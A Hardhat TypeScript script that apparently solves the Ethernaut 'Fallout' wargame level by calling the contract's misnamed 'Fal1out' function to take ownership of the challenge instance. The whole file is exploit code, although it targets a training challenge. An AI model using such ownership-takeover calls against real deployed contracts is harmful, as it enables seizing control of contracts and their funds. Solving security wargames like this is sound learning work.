import hre, { ethers } from "hardhat";
import { BLOCK_EXPLORER_URL } from "../hardhat.config";

async function falloutExploit() {
  const falloutInstanceAddress = process.env.FALLOUT_ADDRESS!;
  const accounts = await ethers.getSigners();
  const attacker = accounts[0];

  const fallout = await ethers.getContractAt("Fallout", falloutInstanceAddress);
  const tx = await fallout.connect(attacker).Fal1out();
  console.log(`${BLOCK_EXPLORER_URL}/${tx.hash}`);
  await tx.wait();

  console.log("SUCCESS!!! Submit the instance");
}

falloutExploit().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
